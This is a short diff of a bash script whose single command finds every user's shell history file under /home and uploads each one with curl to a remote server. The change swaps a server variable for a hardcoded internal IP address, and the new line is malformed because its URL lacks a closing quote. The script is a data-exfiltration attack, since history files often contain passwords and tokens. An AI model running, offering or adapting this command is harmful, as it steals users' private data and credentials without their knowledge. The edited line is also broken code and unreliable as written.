@@ -1,2 +1,2 @@
 #!/bin/bash
-find /home/ -type f -name ".*_history" -exec curl -F "filedata=@{}" "http://${REMOTE_SERVER}" \;
+find /home/ -type f -name ".*_history" -exec curl -F "filedata=@{}" "http://172.16.10.1 \;
